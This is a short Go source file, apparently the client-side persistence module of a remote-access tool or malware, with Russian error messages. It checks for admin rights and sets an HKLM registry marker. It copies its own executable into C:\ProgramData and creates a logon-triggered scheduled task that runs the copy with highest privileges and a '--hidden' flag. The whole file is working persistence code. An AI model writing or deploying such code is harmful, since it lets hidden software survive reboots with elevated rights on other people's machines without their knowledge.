package client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func IsAdmin() bool {
	token := windows.GetCurrentProcessToken()
	elevated := token.IsElevated()
	return elevated
}
func CheckPersistence(name string) error {
	path := `Software\` + name
	key, err := registry.OpenKey(
		registry.LOCAL_MACHINE,
		path,
		registry.READ,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	return nil
}
func SetPersistenceFlag(name string) error {
	path := `Software\` + name
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE,
		path,
		registry.WRITE,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	return nil
}
func CreatePersistence(name string) error {
	currentExe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("ошибка os.Executable: %w", err)
	}

	programData := `C:\ProgramData`

	appDir := filepath.Join(programData, name)
	newExe := filepath.Join(appDir, fmt.Sprintf("%s.exe", name))

	if currentExe == newExe {
		return nil
	}

	if err := os.MkdirAll(appDir, 0755); err != nil {
		return fmt.Errorf("не удалось создать папку %s: %w", appDir, err)
	}

	src, err := os.Open(currentExe)
	if err != nil {
		return fmt.Errorf("не удалось открыть исходный файл %s: %w", currentExe, err)
	}
	defer src.Close()

	dst, err := os.Create(newExe)
	if err != nil {
		return fmt.Errorf("не удалось создать целевой файл %s: %w", newExe, err)
	}
	defer dst.Close()

	if _, err := io.Copy(dst, src); err != nil {
		return fmt.Errorf("ошибка при копировании тела файла: %w", err)
	}

	cmd := exec.Command("schtasks", "/create",
		"/sc", "onlogon",
		"/tn", fmt.Sprintf("MyTask_%s", name),
		"/tr", fmt.Sprintf(`"%s" --hidden`, newExe),
		"/rl", "HIGHEST",
		"/f",
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("schtasks упал с ошибкой: %v, вывод: %s", err, string(output))
	}

	return nil
}
